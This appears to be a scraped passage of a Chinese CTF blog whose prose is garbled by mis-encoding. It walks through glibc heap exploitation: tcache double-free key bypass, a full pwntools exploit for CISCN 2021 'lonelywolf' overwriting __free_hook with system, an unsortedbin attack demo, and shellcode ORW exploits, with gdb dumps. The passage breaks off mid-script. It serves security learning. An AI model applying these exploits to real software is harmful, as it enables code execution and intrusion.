å¦‚æœæˆ‘ä»¬è¿˜æƒ³è¦ä½¿ç”¨tcache double freeçš„è¯ å°±åªèƒ½ä¿®æ”¹keyå­—æ®µ\ndebug_exp:\nfrom pwn import*p = process(&quot;./2heap&quot;)elf = ELF(&quot;./2heap&quot;)#libc = ELF(&quot;./libc-2.23.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def add(size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&quot;You can customize the size of house here, but what about your life&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;add something to your house\\n&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;every decision you made is meaningful&#x27;)    p.sendline(str(index))def edit(index,size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;It&#x27;s never too late to make changes&quot;)    p.sendline(str(index))    p.recvuntil(b&quot;something interesting here&quot;)    p.sendline(str(size))    p.sendlineafter(b&quot;Now add something&quot;,payload)def show(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&quot;Let&#x27;s see what you can do&quot;)    p.sendline(str(index))add(0x10,b&#x27;aaaa&#x27;)delete(0)debug()payload = p64(0)*2edit(0,len(payload),payload)delete(0)p.interactive\n\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0xe3d000Size: 0x251Free chunk (tcachebins) | PREV_INUSEAddr: 0xe3d250Size: 0x21fd: 0x00Top chunk | PREV_INUSEAddr: 0xe3d270Size: 0x20d91pwndbg&gt; x/4gx 0xe3d2500xe3d250:\t0x0000000000000000\t0x00000000000000210xe3d260:\t0x0000000000000000\t0x0000000000e3d010pwndbg&gt; x/4gx 0xe3d0000xe3d000:\t0x0000000000000000\t0x00000000000002510xe3d010:\t0x0000000000000001\t0x0000000000000000\nå¯ä»¥çœ‹åˆ°æ‰€è°“çš„keyæ£€æŸ¥ ä¹Ÿå°±æ˜¯åœ¨tcachebinä¸­çš„chunkçš„bkåŸŸå­˜å…¥tcache_perthread_structç»“æ„ä½“çš„åœ°å€\nä¹Ÿå°±æ˜¯åœ¨å †åŸºå€å¤„0x251å¤§å°çš„chunk\nè·Ÿç€expèµ°ï¼Œå¯ä»¥æˆåŠŸæŠŠå¤„äºtcachebinä¸­çš„chunkçš„bkåŸŸæ¸…ç©ºè¿™æ ·å†æ¬¡freeçš„æ—¶å€™å°±ä¸ä¼šè§¦å‘double free\n[CISCN 2021 åˆèµ›]lonelywolfä¿æŠ¤å…¨å¼€ï¼Œå››è‚¢å¥å…¨addä»…èƒ½æœ‰ä¸€ä¸ªchunkï¼Œæœ€å¤§size&#x3D;0x78 freeå­˜åœ¨UAFå…ˆè€ƒè™‘ç”¨ä¸€æ¬¡double freeæ¥æ³„éœ²å †åœ°å€\nadd(0x78)free()edit(p64(0)*2)free()show()p.recvuntil(b&#x27;Content: &#x27;)heap_base = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x260\nç¬¬äºŒæ¬¡freeå‰çš„ç»“æ„double freeåï¼Œè¯¥chunkçš„bkæŒ‡å‘è¯¥chunkçš„åœ°å€ï¼Œå¯ç”¨äºæ³„éœ²heapbaseéšåé€šè¿‡æ”»å‡»tcache structæ¥åˆ†é…ä¸€ä¸ª0x250çš„å †å—åä½¿å…¶è¿›å…¥unsorted binæ¥æ³„éœ²libc\nedit(p64(heap_base + 0x10))add(0x78)add(0x78)edit(b&#x27;\\x00&#x27;*35 + b&#x27;\\x07&#x27;)free()show()libc_base = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;)) - 0x70 - libc.sym[&#x27;__malloc_hook&#x27;]\næ”»å‡»é€ æˆçš„åæœï¼šåç»­å†ä¿®æ”¹tcache structæ¥æ‰“freehookå³å¯\nedit(b&#x27;\\x01\\x01&#x27; + b&#x27;\\xff&#x27;*0x3e + p64(free_hook) + p64(heap_base + 0x260))add(0x10)edit(p64(system))add(0x20)edit(b&#x27;/bin/sh\\x00&#x27;)\nåé¢çš„å †ç»“æ„åœ¨gdbçœ‹æ¥å°±å¯„äº†ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ï¼š\nfrom struct import packfrom ctypes import *from LibcSearcher import *from pwn import *def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def get_sb():    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = process(&#x27;./lonelywolf&#x27;)#p = remote(&#x27;node4.anna.nssctf.cn&#x27;, 28681)elf = ELF(&#x27;./lonelywolf&#x27;)#libc = ELF(&#x27;./libc-2.27-x64.so&#x27;)libc = ELF(&#x27;/home/str1k3/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6&#x27;)def add(size):    p.sendlineafter(b&#x27;choice: &#x27;, b&#x27;1&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;, b&#x27;0&#x27;)    p.sendlineafter(b&#x27;Size: &#x27;, str(size))def edit(content):    p.sendlineafter(b&#x27;choice: &#x27;, b&#x27;2&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;, b&#x27;0&#x27;)    p.sendlineafter(b&#x27;Content: &#x27;, content)def show():    p.sendlineafter(b&#x27;choice: &#x27;, b&#x27;3&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;, b&#x27;0&#x27;)def free():    p.sendlineafter(b&#x27;choice: &#x27;, b&#x27;4&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;, b&#x27;0&#x27;)debug()# leak heap_baseadd(0x78)free()edit(p64(0)*2)free()show()p.recvuntil(b&#x27;Content: &#x27;)heap_base = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x260# double free -&gt; tcache struct -&gt; leak libc_baseedit(p64(heap_base + 0x10))add(0x78)add(0x78)edit(b&#x27;\\x00&#x27;*35 + b&#x27;\\x07&#x27;)free()show()libc_base = get_addr() - 0x70 - libc.sym[&#x27;__malloc_hook&#x27;]# free_hook -&gt; systemfree_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]one_gadget = libc_base + 0x10a38csystem = libc_base + libc.sym[&#x27;system&#x27;]edit(b&#x27;\\x01\\x01&#x27; + b&#x27;\\xff&#x27;*0x3e + p64(free_hook) + p64(heap_base + 0x260))add(0x10)edit(p64(system))add(0x20)edit(b&#x27;/bin/sh\\x00&#x27;)# pwnfree()p.interactive()\n\nglibc2.29åŠ å…¥äº†stashæœºåˆ¶ï¼Œå¯¼è‡´tcachebinå­˜åœ¨ä¸fastbinä»¥åŠsmallbinçš„â€˜è”åŠ¨â€™æ¼æ´ï¼Œå†™å®Œfastbinå’Œsmallbinå†å›æ¥è¡¥å……å‰é¢çš„æ”»å‡»æ‰‹æ®µï¼Œä»¥åå†æ¥æ¢ç´¢å§~\n","categories":["heap"],"tags":["bin"]},{"title":"unsortedbin_attack","url":"/2023/08/29/unsortedbin-attack/","content":"unsortedbin_attackï¼Œpart leakåœ¨glibcç‰ˆæœ¬2.26(å¯ä»¥ç®€å•è®°æˆ18.04å)ä»¥åï¼ŒåŠ å…¥äº†tcachebinæœºåˆ¶é’ˆå¯¹tcachebinæœºåˆ¶çš„æ”»å‡»ä¹‹åå†èŠ\nå›åˆ°unsortedbinï¼Œtcachebinæœºåˆ¶çš„åŠ å…¥ä¸»è¦å½±å“çš„æ˜¯å¤§å°å°äºfastbinæˆ–tcachebinçš„å †å—å¤§äºæ­¤çš„å †å—è¢«freeåä¼šç›´æ¥è¿›å…¥unsortedbinå°äºæ­¤çš„å †å—è¢«freeåä¼šè¿›å…¥tcachebinï¼Œç›´åˆ°tcachebinçš„ä¸€æ¡é“¾è¡¨è¢«å¡«æ»¡ï¼ˆ7ä¸ªchunkï¼‰æ‰€ä»¥æˆ‘ä»¬åªè¦ç”¨7ä¸ªchunkå¡«æ»¡å®ƒï¼Œå°±èƒ½ç»•è¿‡tcachebinæœºåˆ¶ï¼Œè¿›å…¥unsortedbindebug_code:\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;char *heap[0x20];int num=0;int getnum()&#123;\t  char s[24]; // [rsp+0h] [rbp-20h] BYREF  uint64_t v1; // [rsp+18h] [rbp-8h]  v1 = read(0x28u);  memset(s, 0, sizeof(s));  read(0, s, 0x17uLL);  return atoi(s);&#125;int create()&#123;    int size;    int result;    puts(&quot;input your size:&quot;);    size = getnum();    heap[num]=(char *)malloc(size);    result = num++;    puts(&quot;success!&quot;);    return result;&#125;void show()&#123;\tint idx;\tputs(&quot;idx:&quot;);\tidx = getnum(); \tif (!heap[idx]) \t&#123;    \tputs(&quot;nothing here\\n&quot;);\t&#125; \telse &#123;    printf(&quot;content:&quot;);    printf(&quot;%s&quot;,heap[idx]);  &#125;&#125;void dele()&#123;\tint idx;  \tputs(&quot;idx:&quot;);  \tidx = getnum();\tif (!heap[idx]) \t&#123;    puts(&quot;nothing here\\n&quot;);\t&#125; \telse \t&#123;    free(heap[idx]);    heap[idx]=NULL;    num--;    puts(&quot;success!&quot;);\t&#125;&#125;void edit()&#123;\tint size;\tint idx;\tputs(&quot;idx:&quot;);  \tidx = getnum();\tif (!heap[idx]) \t&#123;    puts(&quot;nothing here\\n&quot;);\t&#125; \telse \t&#123;    puts(&quot;input your size:&quot;);    size = getnum();    puts(&quot;content:&quot;);    read(0,heap[idx],size);    puts(&quot;success!&quot;);\t&#125;&#125;void menu(void)&#123;    puts(&quot;1.create&quot;);    puts(&quot;2.delete&quot;);    puts(&quot;3.edit&quot;);    puts(&quot;4.show&quot;);    puts(&quot;your choice:&quot;);&#125;int main()&#123;  int choice;  while ( 1 ) &#123;     while(1)    &#123;           setbuf(stdin, 0);\t\tsetbuf(stdout, 0);        menu();        scanf(&quot;%d&quot;,&amp;choice);        if ( choice == 1 )\t\t&#123;\t\t  create();\t\t&#125;\t\t\t\telse if ( choice == 3 )\t\t&#123;\t\t  edit();\t\t&#125;\t\telse if ( choice == 4 )\t\t&#123;\t\t  show();\t\t&#125;\t\telse if ( choice ==2  )\t\t&#123;\t\t  dele();\t\t&#125;\t\telse\t\t&#123;\t\t  puts(&quot;Invalid choice&quot;);\t\t  exit(0);\t\t&#125;\t&#125; &#125;&#125; \n\ndebug_exp:\nfrom struct import packfrom ctypes import *from LibcSearcher import *from pwn import *def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = process(&#x27;./testheap&#x27;)elf = ELF(&#x27;./testheap&#x27;)#libc = ELF(&#x27;./libc-2.23.so&#x27;)def create(size):\tp.sendlineafter(b&#x27;choice:\\n&#x27;, b&#x27;1&#x27;)\tp.sendlineafter(b&#x27;size:\\n&#x27;, str(size))def dele(idx):\tp.sendlineafter(b&#x27;choice:\\n&#x27;, b&#x27;2&#x27;)\tp.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))def edit(idx, size, content):\tp.sendlineafter(b&#x27;choice: \\n&#x27;, b&#x27;3&#x27;)\tp.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))\tp.sendlineafter(b&#x27;size:\\n&#x27;, str(size))\tp.sendlineafter(b&#x27;content:\\n&#x27;, str(content))def show(idx):\tp.sendlineafter(b&#x27;choice:\\n&#x27;, b&#x27;4&#x27;)\tp.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))debug()create(0x90)create(0x20)for i in  range(3,11):    create(0x90)for i in range(3,11):    dele(i)dele(0)  #è¯¥chunkè¿›å…¥unsortedbinpause()create(0x45)pause()show(11)\nfreeæ‰7ä¸ªchunkä»¥ç»•è¿‡tcachebin\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x9cb000Size: 0x251Free chunk (unsortedbin) | PREV_INUSEAddr: 0x9cb250Size: 0xa1fd: 0x7ff473e90ca0bk: 0x7ff473e90ca0Allocated chunkAddr: 0x9cb2f0Size: 0x30Allocated chunk | PREV_INUSEAddr: 0x9cb320Size: 0xa1Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb3c0Size: 0xa1fd: 0x00Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb460Size: 0xa1fd: 0x9cb3d0Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb500Size: 0xa1fd: 0x9cb470Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb5a0Size: 0xa1fd: 0x9cb510Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb640Size: 0xa1fd: 0x9cb5b0Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb6e0Size: 0xa1fd: 0x9cb650Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb780Size: 0xa1fd: 0x9cb6f0Top chunk | PREV_INUSEAddr: 0x9cb820Size: 0x207e1\nå¦‚æœunsortedbinçš„é“¾è¡¨ä¸­åªæœ‰å…¶ä¸€ä¸ªå †å— é‚£ä¹ˆä»–çš„fdåŸŸå’ŒbkåŸŸéƒ½å°†æŒ‡å‘main_arena+96ï¼ˆmain_arena+x,xä¸glibcç‰ˆæœ¬å”¯ä¸€ç›¸å…³ä¸”ç¡®å®šï¼‰\npwndbg&gt; bintcachebins0xa0 [  7]: 0x9cb790 â€”â–¸ 0x9cb6f0 â€”â–¸ 0x9cb650 â€”â–¸ 0x9cb5b0 â€”â–¸ 0x9cb510 â€”â–¸ 0x9cb470 â€”â–¸ 0x9cb3d0 â—‚â€” 0x0fastbinsemptyunsortedbinall: 0x9cb250 â€”â–¸ 0x7ff473e90ca0 (main_arena+96) â—‚â€” 0x9cb250smallbinsemptylargebinsempty\nunsortedbinå†…æ­¤æ—¶çš„ç»“æ„\npwndbg&gt; x/40gx 0x9cb2500x9cb250:\t0x0000000000000000#prev_size#\t0x00000000000000a1#size0x9cb260:\t0x00007ff473e90ca0#fd#\t0x00007ff473e90ca0#bk0x9cb270:\t0x0000000000000000\t0x00000000000000000x9cb280:\t0x0000000000000000\t0x00000000000000000x9cb290:\t0x0000000000000000\t0x00000000000000000x9cb2a0:\t0x0000000000000000\t0x00000000000000000x9cb2b0:\t0x0000000000000000\t0x00000000000000000x9cb2c0:\t0x0000000000000000\t0x00000000000000000x9cb2d0:\t0x0000000000000000\t0x00000000000000000x9cb2e0:\t0x0000000000000000\t0x00000000000000000x9cb2f0:\t0x00000000000000a0\t0x00000000000000300x9cb300:\t0x0000000000000000\t0x00000000000000000x9cb310:\t0x0000000000000000\t0x00000000000000000x9cb320:\t0x0000000000000000\t0x00000000000000a10x9cb330:\t0x0000000000000000\t0x00000000000000000x9cb340:\t0x0000000000000000\t0x00000000000000000x9cb350:\t0x0000000000000000\t0x00000000000000000x9cb360:\t0x0000000000000000\t0x00000000000000000x9cb370:\t0x0000000000000000\t0x00000000000000000x9cb380:\t0x0000000000000000\t0x0000000000000000\n\nFree chunk (unsortedbin) | PREV_INUSEAddr: 0x1bd6250Size: 0xa1fd: 0x7fe2527beca0bk: 0x7fe2527beca0\ncreateä¸€ä¸ª0x45çš„chunkå\nAllocated chunk | PREV_INUSEAddr: 0x9cb250Size: 0x51Free chunk (unsortedbin) | PREV_INUSEAddr: 0x9cb2a0Size: 0x51fd: 0x7ff473e90ca0bk: 0x7ff473e90ca0\nå¯è§å½“ç”¨æˆ·ç”³è¯·æ–°çš„ç©ºé—´æ—¶ï¼Œç³»ç»Ÿä¼šä¼˜å…ˆåˆ†å‰²unsortedbinä¸­çš„ç©ºé—´ï¼ˆç”³è¯·çš„ç©ºé—´å°äºç­‰äºunsortedbinçš„ç©ºé—´ï¼‰\næ­¤æ—¶æ–°chunkå†…çš„ç»“æ„\npwndbg&gt; x/40gx 0x9cb2500x9cb250:\t0x0000000000000000\t0x00000000000000510x9cb260:\t0x00007ff473e90d30\t0x00007ff473e90d300x9cb270:\t0x0000000000000000\t0x00000000000000000x9cb280:\t0x0000000000000000\t0x00000000000000000x9cb290:\t0x0000000000000000\t0x00000000000000000x9cb2a0:\t0x0000000000000000\t0x00000000000000510x9cb2b0:\t*0x00007ff473e90ca0\t*0x00007ff473e90ca00x9cb2c0:\t0x0000000000000000\t0x00000000000000000x9cb2d0:\t0x0000000000000000\t0x00000000000000000x9cb2e0:\t0x0000000000000000\t0x00000000000000000x9cb2f0:\t0x0000000000000050\t0x00000000000000300x9cb300:\t0x0000000000000000\t0x00000000000000000x9cb310:\t0x0000000000000000\t0x00000000000000000x9cb320:\t0x0000000000000000\t0x00000000000000a10x9cb330:\t0x0000000000000000\t0x00000000000000000x9cb340:\t0x0000000000000000\t0x00000000000000000x9cb350:\t0x0000000000000000\t0x00000000000000000x9cb360:\t0x0000000000000000\t0x00000000000000000x9cb370:\t0x0000000000000000\t0x00000000000000000x9cb380:\t0x0000000000000000\t0x0000000000000000\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°åŸæ¥chunkçš„fdä¸bkéƒ½è¢«ä¿ç•™å¯ä»¥å€Ÿæ­¤æ³„éœ²libcåŸºå€ï¼ˆèƒ½æ‰“å°chunkä¸­æ•°æ®çš„æƒ…å†µï¼‰\nunsortedbin_attackï¼Œpart useåœ¨malloc.cä¸­çš„_int_mallocæœ‰ä¸€æ®µå…³äºUnsorted bin chunkæ‘˜é™¤çš„ä»£ç ï¼š\n/* remove from unsorted list */if (__glibc_unlikely (bck-&gt;fd != victim))\tmalloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);unsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av);\nçœ‹åä¸¤è¡Œå°±å¥½äº†ï¼Œunsorted_chunkçš„bkæŒ‡é’ˆæŒ‡å‘çš„æ˜¯å®ƒåä¸€ä¸ªè¢«é‡Šæ”¾çš„chunkçš„å—åœ°å€ï¼ˆbckï¼‰ï¼Œåä¸€ä¸ªè¢«é‡Šæ”¾çš„chunkçš„fdæŒ‡é’ˆæŒ‡å‘çš„æ˜¯unsorted_chunkçš„å—åœ°å€ã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶unsorted_chunkçš„bkï¼Œé‚£ä¹ˆå°±æ„å‘³ç€å¯ä»¥å°†unsorted_chunks (av)ï¼Œå³unsorted_chunkçš„å—åœ°å€å†™åˆ°ä»»æ„å¯å†™åœ°å€å†…ä¸€æ®µæ¥è‡ªhow2heapçš„ä»£ç ï¼Œå·²ç»å»æ‰è‹±æ–‡è§£è¯´\n//gcc how2heap.c -g -no-pie -o unsorted_bin#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123;unsigned long target_var = 0;//ä¿®æ”¹ç›®æ ‡fprintf(stderr,&quot;&amp;target_var and target_var:\\n&quot;);fprintf(stderr, &quot;%p: %ld\\n\\n&quot;, &amp;target_var, target_var);unsigned long *p = malloc(400);//chunk0fprintf(stderr, &quot;The first chunk_addr at: %p\\n&quot;,p);malloc(500);//chunk1free(p);//*breakpoint1fprintf(stderr, &quot;The first chunk_fd is %p\\n&quot;,(void *)p[1]);p[1] = (unsigned long)(&amp;target_var - 2);//*breakpoint2fprintf(stderr, &quot;Now,The first chunk_fd is %p\\n\\n&quot;, (void *)p[1]);malloc(400);//chunk2fprintf(stderr, &quot;target has been rewrite %p: %p\\n&quot;, &amp;target_var, (void *)target_var);&#125;\nåˆ›å»ºä¸€ä¸ªåä¸ºtarget_varçš„æ— ç¬¦å·é•¿æ•´å‹å˜é‡ï¼Œå¹¶å°†å…¶åˆå§‹åŒ–ä¸º0ã€‚ä½¿ç”¨fprintfå‡½æ•°æ‰“å°target_varçš„åœ°å€å’Œå€¼ã€‚åˆ†é…ä¸€ä¸ª400å­—èŠ‚å¤§å°çš„chunkï¼Œå¹¶å°†å…¶åœ°å€å­˜å‚¨åœ¨æŒ‡é’ˆå˜é‡pä¸­ã€‚ä½¿ç”¨fprintfå‡½æ•°æ‰“å°ç¬¬ä¸€ä¸ªå†…å­˜å—çš„åœ°å€ã€‚åˆ†é…ä¸€ä¸ª500å­—èŠ‚å¤§å°çš„chunkï¼ˆæ­¤å¤„æ²¡æœ‰å­˜å‚¨å…¶è¿”å›å€¼ï¼‰ã€‚é‡Šæ”¾ä¹‹å‰åˆ†é…çš„å†…å­˜å—pã€‚ä½¿ç”¨fprintfå‡½æ•°æ‰“å°ç¬¬ä¸€ä¸ªå†…å­˜å—çš„ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆp[1]ï¼‰çš„å€¼ï¼Œæ­¤æ—¶å®ƒå°†æ˜¾ç¤ºå…ˆå‰åˆ†é…çš„å†…å­˜å—çš„fdï¼ˆfree chunkä¸­çš„å‰å‘æŒ‡é’ˆï¼‰ã€‚å°†ç¬¬ä¸€ä¸ªå†…å­˜å—çš„ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆp[1]ï¼‰ä¿®æ”¹ä¸ºtarget_varçš„åœ°å€å‡å»2ï¼ˆ&amp;target_var - 2ï¼‰ï¼Œå³ä½¿å¾—å…¶æŒ‡å‘target_varä¹‹å‰çš„ä½ç½®ã€‚ä½¿ç”¨fprintfå‡½æ•°å†æ¬¡æ‰“å°ç¬¬ä¸€ä¸ªå†…å­˜å—çš„ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆp[1]ï¼‰çš„å€¼ï¼Œæ­¤æ—¶å®ƒå°†æ˜¾ç¤ºä¿®æ”¹åçš„åœ°å€ã€‚åˆ†é…ä¸€ä¸ª400å­—èŠ‚å¤§å°çš„å†…å­˜å—ã€‚ä½¿ç”¨fprintfå‡½æ•°æ‰“å°target_varçš„åœ°å€å’Œå€¼ï¼Œç°åœ¨target_varå·²è¢«ç¯¡æ”¹ï¼Œå…¶å€¼åº”è¯¥æ˜¯ä¿®æ”¹åçš„åœ°å€ã€‚\næ¥ä¸‹æ¥è·Ÿç€gdbå•æ­¥çœ‹å†…å­˜æƒ…å†µç”±äºç¬”è€…16.04çš„ç¯å¢ƒgäº†ï¼Œé€šè¿‡ä¸Šé¢ç»•è¿‡tcacheæœºåˆ¶çš„æ–¹å¼æ¥çœ‹unsortedbinåœåœ¨breakpoint1\nunsortedbinall: 0x602250 â€”â–¸ 0x7ffff7dcdca0 (main_arena+96) â—‚â€” 0x602250 /* &#x27;P&quot;`&#x27; */Free chunk (unsortedbin) | PREV_INUSEAddr: 0x602250Size: 0x1a1fd: 0x7ffff7dcdca0 bk: 0x7ffff7dcdca0\nå¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªè¿›å…¥unsorted_binçš„chunkï¼ˆchunk0ï¼‰çš„fdå’Œbkéƒ½æŒ‡å‘0x7ffff7dcdca0 (main_arena+96)\nç”³è¯·chunk1æ˜¯ä¸ºäº†é˜²æ­¢chunk0åœ¨è¿›å…¥unsorted_binçš„æ—¶å€™ä¸top_chunkåˆå¹¶ï¼Œå¯ä»¥ä¸ç®¡\næ¥ä¸‹æ¥èµ°åˆ°p[1] &#x3D; (unsigned long)(&amp;target_var - 2);è¿™æ®µä»£ç å…¶å®ä¿®æ”¹çš„æ˜¯chunk0çš„bkæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘äº†target_var_addr - 0x10è¿™ä¸€å¤„åœ°å€\nä¸ºä»€ä¹ˆå‡å»çš„æ˜¯0x10ï¼Œå› ä¸ºtarget_var æ˜¯unsigned longç±»å‹çš„ï¼Œ&amp;target_var - 2å°±æ„å‘³ç€è¦å‡å»ä¸¤ä¸ªåœ°å€ä½å®½ï¼ˆ8 + 8ï¼‰ä¸ºä»€ä¹ˆè¦å‡å»0x10ï¼Œè¿™æ˜¯å› ä¸ºæƒ³å°†target_varæ‰€åœ¨åœ°å€ä½œä¸ºä¸€ä¸ªfake_chunkçš„mallocåœ°å€ï¼Œå³fake_chunkçš„fdä½ç½®ï¼Œå‡0x10çš„ä½ç½®å°±æ˜¯fake_chunkçš„å—æŒ‡é’ˆï¼Œè¿™æ ·æ‰ç¬¦åˆUnsorted binåŒå‘é“¾è¡¨çš„è§„åˆ™\næ¥ä¸‹æ¥èµ°åˆ°malloc(400);\nunsortedbinall [corrupted]FD: 0x602250 â€”â–¸ 0x7ffff7dcdca0 (main_arena+96) â—‚â€” 0x602250 /* &#x27;P&quot;`&#x27; */BK: 0x602250 â€”â–¸ 0x7fffffffe2a0 â€”â–¸ 0x602260 â—‚â€” 0x0\nè¿™é‡Œç³»ç»ŸæŠŠunsorted_binä¸­çš„chunk0çš„ç©ºé—´åˆ†é…ç»™äº†chunk2\nåœ¨æ‰§è¡Œ p[1] &#x3D; (unsigned long)(&amp;target_var - 2)ä¿®æ”¹å®Œchunk0çš„bkæŒ‡é’ˆåï¼Œbké“¾æ¥çš„å°±æ˜¯ä»¥target - 0x10ä¸ºå—å¤´çš„fake_chunkäº†ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºchunk0ç°åœ¨è¿˜æŒ‚åœ¨unsorted_binä¸­ï¼Œæˆ‘ä»¬æ­¤æ—¶æ›´æ”¹chunk0çš„bkä¼šå¯¼è‡´corrupted\nç”±äºåœ¨ä¸Šä¸€ä¸ªæ­¥éª¤ä¸­å‘ç”Ÿäº†corruptedï¼Œæ‰€ä»¥åœ¨é‡æ–°å¯ç”¨chunk0åˆ†é…åˆ°chunk2çš„æ—¶å€™ï¼Œunsorted_binçš„fdä¾ç„¶è¿˜ä¼šæŒ‡å‘fake_chunkã€‚ä½†chunk0å·²ç»è¢«æ‹¿èµ°äº†ï¼Œæ­¤æ—¶fake_chunkå°±ä¸unsorted_binç›¸é‚»äº†ï¼Œæ‰€ä»¥fake_chunkä½œä¸ºunsorted_binçš„åä¸€ä¸ªchunkï¼Œfake_chunkçš„fdæŒ‡é’ˆï¼ˆå³targetçš„å€¼ï¼‰å°±ä¼šæ‰§è¡Œunsorted_binçš„å—å¤´ã€‚unsorted_binçš„bkæŒ‡é’ˆå°†ä¼šæŒ‡å‘fake_chunkçš„å—å¤´\né‚£ä¹ˆè¿™æ ·ä¸€æ¥targetä¸­çš„å€¼å°±ä»0å˜ä¸ºäº†unsorted_binçš„åœ°å€äº†å‰é¢çš„æ”»å‡»æ‰‹æ®µï¼Œä»¥åå†æ¥æ¢ç´¢å§~\n","categories":["heap"],"tags":["bin"]},{"title":"the_balt_and_road_final","url":"/2023/11/27/the-balt-and-road-final/","content":"æŠ½è±¡çš„èµ›åˆ¶ï¼Œä¸šä½™çš„ä¸»åŠæ–¹ä¸€å¸¦ä¸€è·¯å†³èµ›é¢˜ç›®é™„ä»¶[pwn1]ez_pwn2checksecå¼€äº†æ²™ç›’ç¨‹åºä¼šæŠŠè¾“å…¥çš„ä¸œè¥¿è¯»åˆ°æ ˆä¸Šå¹¶æ‰§è¡Œæ¯”èµ›ä¸­æŠŠé‡ç‚¹æ”¾åˆ°äº†æº¢å‡ºå’Œç›´æ¥å†™shellcodeä¸Šï¼Œå¯¼è‡´ç¨‹åºçš„è·³è½¬æ²¡æ‹¿æä½ä¸‰ä¸ªå°æ—¶é‡Œåšäº†å¾ˆå¤šæ— ç”¨åŠŸï¼Œåé¢åˆå»çœ‹äº†ä¸‹å †é¢˜ï¼ˆpwn2ï¼‰æ²¡è§£å‡ºæ¥èµ›åå‡º\nfrom pwn import *from ctypes import *  context.arch=&#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;def debug():    gdb.attach(p)    pause()#p = remote(&quot;110.110.110.113&quot;,49201)main = 0x4009FCpop_rbp_ret = 0x4008c0pop_rdi_ret = 0x400b53ret = 0x400288leave_ret = 0x400999p = process(&quot;./ez_pwn2&quot;)elf = ELF(&quot;./ez_pwn2&quot;)p.recvuntil(b&#x27;shh:&#x27;)stack_addr = int(p.recv(18),16)success(&quot;stack: %s&quot;,hex(stack_addr))# æ„é€ ä¸€ä¸ªreadshellcode1 = f&#x27;&#x27;&#x27;mov rsi,&#123;stack_addr&#125;mov rdx,0x200syscall&#x27;&#x27;&#x27;payload1 = asm(shellcode1)payload1 = payload1.ljust(0x28,b&#x27;A&#x27;)payload1 += p64(stack_addr)p.sendline(payload1)pause()# ORWshellcode2 = shellcraft.open(&#x27;/flag&#x27;)shellcode2+= shellcraft.read(3,&#x27;rsp&#x27;,0x40)shellcode2 += shellcraft.write(1,&#x27;rsp&#x27;,0x40)payload2 = len(payload1) * b&#x27;\\x90&#x27; + asm(shellcode1)p.sendline(payload2)p.interactive()\n\n[pwn2]drunkå¾ˆå¸¸è§„çš„å †é¢˜æ‰“çš„æ—¶å€™ntæ²¡æ‰¾åˆ°é‚£ä¸ªbackdoorçœ‹æ¥è¿˜å¾—å­¦ä¸€æ‰‹ä¿®å¤\nfrom pwn import*p = remote(&#x27;110.110.110.113&#x27;,49211)#p = process(&quot;./drunk2&quot;)elf = ELF(&quot;./drunk2&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def add(size,payload):    